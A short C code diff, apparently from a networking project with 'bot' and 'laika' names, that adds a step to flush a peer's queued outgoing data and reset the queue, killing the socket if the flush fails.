@@ -105,5 +105,13 @@ _BOTKILL:
     laikaS_kill(&bot->peer->sock);
 LAIKA_TRYEND
 
+    /* flush pList's outQueue */
+    if (bot->pList.outCount > 0) {
+        if (!laikaS_handlePeerOut(bot->peer))
+            laikaS_kill(&bot->peer->sock);
+
+        laikaP_resetOutQueue(&bot->pList);
+    }
+
     return true;
 }
